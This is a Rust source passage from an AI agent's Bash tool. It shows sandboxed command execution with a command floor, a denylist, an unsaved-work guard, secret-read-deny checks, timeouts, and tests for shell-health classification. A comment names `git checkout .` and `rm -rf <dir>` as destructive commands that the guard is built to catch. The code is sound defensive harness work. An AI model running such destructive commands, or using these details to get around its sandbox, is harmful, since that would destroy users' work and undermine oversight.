        // unsaved lines with it. Same question Write's guard asks, asked of the
        // shell, before any shell is spawned.
        //
        // #1142: bounded by `UNSAVED_GUARD_BUDGET_MS`, raced against cancel,
        // and REFUSING on either — see `bounded_unsaved_shell_refusal` for why
        // expiry cannot be allowed to pass.
        let verdict = tokio::select! {
            _ = ctx.cancel.cancelled() => Some("Bash command cancelled by cancellation token".to_string()),
            v = bounded_unsaved_shell_refusal(command, ctx.workspace.clone(), timeout) => v,
        };
        if let Some(refusal) = verdict {
            return ToolResult {
                content: refusal,
                is_error: true,
            };
        }
        let backend = Arc::clone(&ctx.sandbox);
        if let Some(policy) = ctx.workspace.as_deref()
            && !policy.delegated_roots_are_current()
        {
            return ToolResult {
                content: "Refused: delegated workspace identity changed before shell spawn."
                    .to_string(),
                is_error: true,
            };
        }
        // Task 8 — exec-time capability gate. The same immutable session
        // runtime that executes the command decides whether it may run.
        //
        // The predicate is `shell_requires_os_read_deny()`, NOT
        // `secret_read_deny_required()`: a session whose only shell principal is
        // the local operator keeps its shell on a backend that cannot enforce
        // OS read-deny (see `WorkspacePolicy::shell_requires_os_read_deny`).
        // Every channel/remote, Managed and delegated principal is unchanged.
        if let Some(p) = ctx.workspace.as_deref()
            && p.shell_requires_os_read_deny()
            && !backend.enforces_read_deny()
            && !backend.bypasses_containment()
        {
            return ToolResult {
                content: "Refused: shell is unavailable because the active sandbox \
                          backend cannot enforce secret-read-deny for this \
                          workspace."
                    .to_string(),
                is_error: true,
            };
        }
        // #1111: the caller's clock starts HERE, before the manifest build, so
        // `timeout` bounds the manifest build AND the child, not just the
        // child. The build itself is raced against cancellation on the blocking
        // pool — see `spawn_manifest_build` for why an inline call cannot be
        // raced.
        //
        // The P2b unsaved-work guard above used to sit outside this clock
        // entirely — 1,396 ms for `git checkout .` and 968 ms for
        // `rm -rf <dir>` on a 40,000-file work tree, neither cancellable nor
        // bounded. #1142 closed that with a bound of its own rather than by
        // moving this line up: a guard folded under this deadline would PASS
        // on expiry, and a destructive command running unguarded is worse
        // than a slow one. See `bounded_unsaved_shell_refusal`.
        let deadline = tokio::time::Instant::now() + timeout;
        let build = spawn_manifest_build(
            command,
            ctx.workspace.clone(),
            Arc::clone(&ctx.sandbox),
            // Same `backend` handle that runs `execute()` below.
            backend.enforces_read_deny(),
        );
        let build_abort = build.abort_handle();
        let (manifest, mut cmd) = tokio::select! {
            _ = ctx.cancel.cancelled() => {
                build_abort.abort();
                return ToolResult {
                    content: "Bash command cancelled by cancellation token".to_string(),
                    is_error: true,
                };
            },
            built = tokio::time::timeout_at(deadline, build) => match built {
                Ok(Ok(pieces)) => pieces,
                Ok(Err(join)) => {
                    return ToolResult {
                        content: format!(
                            "Failed to execute command: sandbox manifest build failed: {join}"
                        ),
                        is_error: true,
                    };
                }
                Err(_) => {
                    // #1111 acceptance 3 — name the cause. A bare "Command
                    // timed out after Nms" is byte-identical to what the CHILD
                    // timeout below returns, so the caller cannot tell that the
                    // workspace secret-scan ate the whole budget and no child
                    // was ever started. The prefix is kept so anything matching
                    // on it (TUI formatter, breaker telemetry) is unaffected.
                    return ToolResult {
                        content: format!(
                            "Command timed out after {timeout_ms}ms while building the sandbox \
                             manifest (the workspace secret-scan); the command never ran"
                        ),
                        is_error: true,
                    };
                }
            },
        };
        downgrade_powershell_for_sandbox(&mut cmd.argv, backend.blocks_powershell());
        let net = manifest.network.clone();
        // B1: captured before `cmd` is consumed, so a failure can be attributed
        // to a real policy decision instead of surfacing as a bare exit code.
        let scope = SandboxScope::new(&manifest, cmd.cwd.as_deref());
        tokio::select! {
            _ = ctx.cancel.cancelled() => ToolResult {
                content: "Bash command cancelled by cancellation token".to_string(),
                is_error: true,
            },
            result = tokio::time::timeout_at(deadline, backend.execute(&manifest, cmd)) => match result {
                Ok(Ok(output)) => annotate_masked_read(
                    &scope,
                    command,
                    annotate_sandbox_denial(
                        &scope,
                        annotate_network_block(command, net, output_to_result(output)),
                    ),
                ),
                Ok(Err(e)) => exec_error_to_result(&e),
                Err(_) => ToolResult { content: format!("Command timed out after {timeout_ms}ms"), is_error: true },
            },
        }
    }

    /// W8a A.4: ctx-aware streaming path. Same select-on-cancel as
    /// `execute_with_ctx` but preserves W7's chunk-streaming behaviour
    /// when the cancellation token never fires.
    ///
    /// Crucially, this builds the sandbox manifest from `ctx.workspace`
    /// (cwd, allowlists, cache-env, network) exactly as `execute_with_ctx`
    /// does, so the streamed command runs inside the WorkspacePolicy rather
    /// than with the policy-less `None` fallback that the non-ctx
    /// `execute_streaming` uses.
    async fn execute_streaming_with_ctx(
        &self,
        input: Value,
        ctx: &ToolContext,
        sink: &dyn ToolOutputSink,
    ) -> ToolResult {
        let Some(command) = input["command"].as_str() else {
            return ToolResult {
                content: "Missing required parameter: command".to_string(),
                is_error: true,
            };
        };

        // #693 — the non-bypassable command floor. FIRST, before every other
        // guard: it answers below approval mode, --force, sandbox selection and
        // every escape-hatch environment variable, so nothing above it can
        // decide not to ask.
        if let Some(refusal) = wcore_config::command_floor::floor_refusal(
            command,
            ctx.workspace.as_deref().map(|p| p.root()),
        ) {
            return ToolResult {
                content: refusal,
                is_error: true,
            };
        }

        if let Some(reason) = check_denylist(command) {
            return ToolResult {
                content: reason.to_string(),
                is_error: true,
            };
        }

        let timeout_ms = input["timeout"]
            .as_u64()
            .unwrap_or(DEFAULT_TIMEOUT_MS)
            .min(MAX_TIMEOUT_MS);
        let timeout = Duration::from_millis(timeout_ms);

        // P2b — a command that discards the work tree may not take the user's
        // unsaved lines with it. Same question Write's guard asks, asked of the
        // shell, before any shell is spawned.
        //
        // #1142: same bound and same fail-closed expiry as `execute_with_ctx`.
        let verdict = tokio::select! {
            _ = ctx.cancel.cancelled() => Some("Bash command cancelled by cancellation token".to_string()),
            v = bounded_unsaved_shell_refusal(command, ctx.workspace.clone(), timeout) => v,
        };
        if let Some(refusal) = verdict {
            return ToolResult {
                content: refusal,
                is_error: true,
            };
        }

        // Task 8 — exec-time capability gate (streaming path, same logic as
        // execute_with_ctx). Must check BEFORE wrapping in Arc.
        let backend = Arc::clone(&ctx.sandbox);
        if let Some(policy) = ctx.workspace.as_deref()
            && !policy.delegated_roots_are_current()
        {
            return ToolResult {
                content: "Refused: delegated workspace identity changed before shell spawn."
                    .to_string(),
                is_error: true,
            };
        }
        // Same predicate as `execute_with_ctx` — see the note there.
        if let Some(p) = ctx.workspace.as_deref()
            && p.shell_requires_os_read_deny()
            && !backend.enforces_read_deny()
            && !backend.bypasses_containment()
        {
            return ToolResult {
                content: "Refused: shell is unavailable because the active sandbox \
                          backend cannot enforce secret-read-deny for this \
                          workspace."
                    .to_string(),
                is_error: true,
            };
        }
        // #1111: same defect and same fix as `execute_with_ctx` — fixing only
        // one call site leaves the other live.
        let deadline = tokio::time::Instant::now() + timeout;
        let build = spawn_manifest_build(
            command,
            ctx.workspace.clone(),
            Arc::clone(&ctx.sandbox),
            // Same `backend` handle that runs `execute()` below.
            backend.enforces_read_deny(),
        );
        let build_abort = build.abort_handle();
        let (manifest, mut cmd) = tokio::select! {
            _ = ctx.cancel.cancelled() => {
                build_abort.abort();
                return ToolResult {
                    content: "Bash command cancelled by cancellation token".to_string(),
                    is_error: true,
                };
            },
            built = tokio::time::timeout_at(deadline, build) => match built {
                Ok(Ok(pieces)) => pieces,
                Ok(Err(join)) => {
                    return ToolResult {
                        content: format!(
                            "Failed to execute command: sandbox manifest build failed: {join}"
                        ),
                        is_error: true,
                    };
                }
                Err(_) => {
                    // #1111 acceptance 3 — name the cause. A bare "Command
                    // timed out after Nms" is byte-identical to what the CHILD
                    // timeout below returns, so the caller cannot tell that the
                    // workspace secret-scan ate the whole budget and no child
                    // was ever started. The prefix is kept so anything matching
                    // on it (TUI formatter, breaker telemetry) is unaffected.
                    return ToolResult {
                        content: format!(
                            "Command timed out after {timeout_ms}ms while building the sandbox \
                             manifest (the workspace secret-scan); the command never ran"
                        ),
                        is_error: true,
                    };
                }
            },
        };
        downgrade_powershell_for_sandbox(&mut cmd.argv, backend.blocks_powershell());
        let net = manifest.network.clone();
        // B1: see `execute_with_ctx` — same attribution on the streaming path.
        let scope = SandboxScope::new(&manifest, cmd.cwd.as_deref());

        let mut rx = match backend.execute_streaming(&manifest, cmd) {
            Ok(rx) => rx,
            Err(e) => {
                return exec_error_to_result(&e);
            }
        };

        let mut stdout_buf = String::new();
        let mut stderr_buf = String::new();
        let mut exit_code: Option<i32> = None;

        // #1076: see `execute_streaming` — same tracking on the ctx path.
        let mut lossy = false;

        let run = async {
            while let Some(chunk) = rx.recv().await {
                match chunk {
                    SandboxChunk::Stdout(bytes) => {
                        lossy |= drain_lines(&bytes, sink, &mut stdout_buf);
                    }
                    SandboxChunk::Stderr(bytes) => {
                        lossy |= drain_lines(&bytes, sink, &mut stderr_buf);
                    }
                    SandboxChunk::Exit {
                        exit_code: code, ..
                    } => {
                        exit_code = Some(code);
                    }
                }
            }
        };

        let timed = tokio::time::timeout_at(deadline, run);

        tokio::select! {
            _ = ctx.cancel.cancelled() => ToolResult {
                content: "Bash command cancelled by cancellation token".to_string(),
                is_error: true,
            },
            res = timed => {
                if res.is_err() {
                    return ToolResult {
                        content: format!("Command timed out after {}ms", timeout_ms),
                        is_error: true,
                    };
                }
                let Some(exit_code) = exit_code else {
                    let detail = if stderr_buf.is_empty() {
                        "sandbox produced no exit status".to_string()
                    } else {
                        stderr_buf.trim_end().to_string()
                    };
                    return ToolResult {
                        content: format!("Failed to execute command: {}", detail),
                        is_error: true,
                    };
                };
                let mut content = format!(
                    "Exit code: {}\nSTDOUT:\n{}\nSTDERR:\n{}",
                    exit_code, stdout_buf, stderr_buf
                );
                if lossy {
                    content.push_str(LOSSY_OUTPUT_NOTE);
                }
                annotate_masked_read(
                    &scope,
                    command,
                    annotate_sandbox_denial(
                        &scope,
                        annotate_network_block(
                            command,
                            net,
                            ToolResult {
                                content,
                                is_error: exit_code != 0,
                            },
                        ),
                    ),
                )
            }
        }
    }

    fn supports_streaming(&self) -> bool {
        true
    }

    fn category(&self) -> ToolCategory {
        ToolCategory::Exec
    }

    fn execution_class_for(&self, _input: &Value) -> crate::ToolExecutionClass {
        crate::ToolExecutionClass::ProcessSpawning
    }

    fn describe(&self, input: &Value) -> String {
        let cmd = input.get("command").and_then(|v| v.as_str()).unwrap_or("");
        format!("Execute: {}", crate::truncate_utf8(cmd, 80))
    }
}

#[cfg(test)]
mod health_classification_tests {
    use super::*;

    /// A command the transport refused is rendered as "nothing ran" and is
    /// NOT a tool fault.
    ///
    /// This is the Windows A-4 chain end to end, minus the OS: the sandbox
    /// refuses a `cmd /C` payload carrying a line break (proven to produce
    /// `SandboxError::RequestRefused` by the windows_cmdline unit test),
    /// BashTool renders it, and the classifier must say the shell is fine.
    /// Graded as a fault, three of these in thirty seconds removed Bash from
    /// the agent for a cooldown and the run ended with no work delivered.
    #[test]
    fn a_refused_request_is_not_evidence_the_shell_is_unhealthy() {
        let refused = SandboxError::RequestRefused(
            "a Windows `cmd /C` command line cannot carry a line break.".to_string(),
        );
        let result = exec_error_to_result(&refused);
        assert!(result.is_error, "the caller still has to see a failure");
        assert!(
            result.content.starts_with(REFUSED_PREFIX),
            "a refusal must say nothing ran: {}",
            result.content
        );
        assert!(
            !BashTool.error_is_tool_fault(&result.content),
            "a refused request must not count toward the Bash circuit \
             breaker: {}",
            result.content
        );
    }

    /// A child that ran and exited non-zero is the caller's command failing.
    /// `grep` with no match must never cost the agent its shell.
    #[test]
    fn a_non_zero_exit_is_not_evidence_the_shell_is_unhealthy() {
        let result = output_to_result(SandboxOutput {
            stdout: Vec::new(),
            stderr: b"no such file\n".to_vec(),
            exit_code: 2,
            resource_limits: wcore_sandbox::ResourceLimitEnforcement::None,
        });
        assert!(result.is_error, "exit 2 is still an error to the caller");
        assert!(
            !BashTool.error_is_tool_fault(&result.content),
            "a completed child is a working shell: {}",
            result.content
        );
    }

    /// The control, and the reason this classifier is not just `false`: the
    /// failures the breaker exists for still count. If this ever passes
    /// alongside the two above by returning a constant, the guard is dead.
    #[test]
    fn a_broken_spawn_or_a_timeout_still_counts_as_a_tool_fault() {
        let broken = exec_error_to_result(&SandboxError::ExecFailed(
            "child stdout was not piped".to_string(),
        ));
        assert!(
            BashTool.error_is_tool_fault(&broken.content),
            "a spawn that broke is exactly what the breaker is for: {}",
            broken.content
        );
        assert!(
            BashTool.error_is_tool_fault("Command timed out after 120000ms"),
            "a wedged child must still trip the breaker"
        );
        assert!(
            BashTool.error_is_tool_fault("Bash command cancelled by cancellation token"),
            "a cancellation is not a completed child"
        );
    }
}

#[cfg(test)]
mod tests;
